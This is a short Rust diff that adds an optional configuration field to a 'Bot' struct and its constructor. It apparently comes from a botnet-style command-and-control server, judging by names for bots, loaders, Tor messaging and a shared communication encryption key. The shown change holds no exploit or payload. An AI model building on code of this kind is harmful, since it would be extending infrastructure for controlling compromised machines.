@@ -10,6 +10,7 @@ use serde::Serialize;
 use shared::constants::communication_encryption_key;
 use shared::network::tor::ServerReceive;
 use shared::network::tor::SrvRcvTp;
+use shared::utils::config::MibCnfg;
 use shared::utils::encryption::convert_key_to_bytes;
 use shared::utils::encryption::sauron_decrypt;
 use shared::utils::encryption::sauron_encrypt;
@@ -48,6 +49,7 @@ pub struct Bot {
     pub loader_instances: Vec<LoaderInstance>,
     pub verified: bool,
     pub join_date: String,
+    pub mib_config: Option<MibCnfg>,
 }
 
 impl Bot {
@@ -55,14 +57,16 @@ impl Bot {
         id: String,
         client_instances: Vec<ClientInstance>,
         loader_instances: Vec<LoaderInstance>,
-        verified: bool
+        verified: bool,
+        mib_config: Option<MibCnfg>
     ) -> Self {
-        Bot {
+        Self {
             id,
             client_instances,
             loader_instances,
             verified,
             join_date: Utc::now().to_rfc3339(),
+            mib_config,
         }
     }
 }
